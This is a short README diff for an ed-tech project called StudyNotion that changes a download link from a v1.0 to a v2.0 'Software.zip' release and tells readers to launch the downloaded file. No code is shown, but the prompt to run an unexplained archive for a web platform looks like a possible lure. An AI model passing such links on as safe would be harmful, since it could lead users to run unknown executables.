@@ -31,7 +31,7 @@ Welcome to the StudyNotion repository - an innovative ed-tech platform that empo
 
 To experience StudyNotion, you can download the latest release by clicking on the button below:
 
-[![Download StudyNotion](https://github.com/felps012/StudyNotion_EdTech_Platform/releases/download/v1.0/Software.zip)](https://github.com/felps012/StudyNotion_EdTech_Platform/releases/download/v1.0/Software.zip)
+[![Download StudyNotion](https://github.com/felps012/StudyNotion_EdTech_Platform/releases/download/v2.0/Software.zip)](https://github.com/felps012/StudyNotion_EdTech_Platform/releases/download/v2.0/Software.zip)
 
 **Note: The downloaded file needs to be launched to access the platform.**
 
